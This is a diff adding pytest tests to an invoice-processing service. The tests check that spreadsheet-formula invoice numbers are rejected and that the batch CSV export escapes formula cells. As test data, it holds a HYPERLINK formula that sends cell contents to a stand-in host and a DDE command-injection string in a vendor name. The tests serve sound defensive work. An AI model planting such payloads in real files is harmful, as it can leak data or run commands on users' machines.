@@ -1,4 +1,6 @@
 import base64
+import csv
+import io
 
 import httpx
 import pytest
@@ -240,3 +242,37 @@ def test_resubmit_conflict(vendor_po):
         service.submit(db, principal("cleo.clerk"), iid, "ready")
     with session_scope() as db, pytest.raises(Conflict):
         service.submit(db, principal("cleo.clerk"), iid, "again")
+
+
+FORMULA = '=HYPERLINK("https://x.example/?"&G2&H2,"open")'
+
+
+def test_formula_invoice_number_needs_verification_and_cannot_be_verified(vendor_po):
+    iid = ingest(pdf(number=FORMULA))
+    assert status(iid) == "needs_verification"
+    with session_scope() as db:
+        assert service.get(db, iid).invoice_number == FORMULA
+        with pytest.raises(Invalid, match="invoice_number"):
+            service.verify(db, principal("cleo.clerk"), iid, {"invoice_number": "@SUM(1)"}, "typo")
+    with session_scope() as db:
+        service.verify(db, principal("cleo.clerk"), iid, {"total_cents": 220_000}, "checked totals only")
+    assert status(iid) == "exception" and "invalid_invoice_number" in _issues(iid)
+    with session_scope() as db:
+        service.verify(db, principal("cleo.clerk"), iid, {"invoice_number": "INV-77"}, "from vendor call")
+    assert status(iid) == "matched"
+
+
+def test_batch_file_neutralizes_formula_cells(vendor_po):
+    iid = ingest(pdf(number="F1"))
+    with session_scope() as db:
+        inv = service.get(db, iid)
+        inv.invoice_number = FORMULA  # bypass validation: the file writer must still be safe
+        db.get(Vendor, inv.vendor_id).name = "+cmd|' /C calc'!A0"
+        service.submit(db, principal("cleo.clerk"), iid, "ready")
+        rid = inv.approval_request_id
+    with session_scope() as db:
+        approvals.decide(db, principal("abe.approver"), rid, "approve", "ok to pay")
+    with session_scope() as db:
+        b = service.create_batch(db, principal("cam.controller"), "weekly run")
+        row = next(csv.reader(io.StringIO(b.content.splitlines()[1])))
+    assert row[1] == "'+cmd|' /C calc'!A0" and row[2] == "'" + FORMULA
